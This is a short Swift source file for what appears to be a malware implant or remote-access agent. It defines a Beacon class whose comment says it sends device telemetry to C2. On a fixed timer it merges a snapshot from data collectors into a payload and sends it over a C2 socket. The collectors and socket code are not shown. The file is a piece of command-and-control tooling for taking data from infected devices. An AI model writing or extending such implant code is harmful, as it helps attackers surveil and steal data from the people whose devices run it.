import Foundation

/// Periodic heartbeat that sends device telemetry to C2 on a fixed interval.
public final class Beacon {
    private weak var socket: C2Socket?
    private var timer: Timer?
    private let collectors: DataCollectors

    public init(socket: C2Socket) {
        self.socket = socket
        self.collectors = DataCollectors()
    }

    public func start() {
        sendBeacon()
        timer = Timer.scheduledTimer(withTimeInterval: Config.beaconInterval, repeats: true) { [weak self] _ in
            self?.sendBeacon()
        }
        RunLoop.main.add(timer!, forMode: .common)
    }

    public func stop() {
        timer?.invalidate()
        timer = nil
    }

    private func sendBeacon() {
        var payload: [String: Any] = [
            "agentVersion": Config.agentVersion,
            "platform":     Config.platform,
        ]
        payload.merge(collectors.snapshot()) { _, new in new }
        socket?.send(type: "BEACON", payload: payload)
    }
}
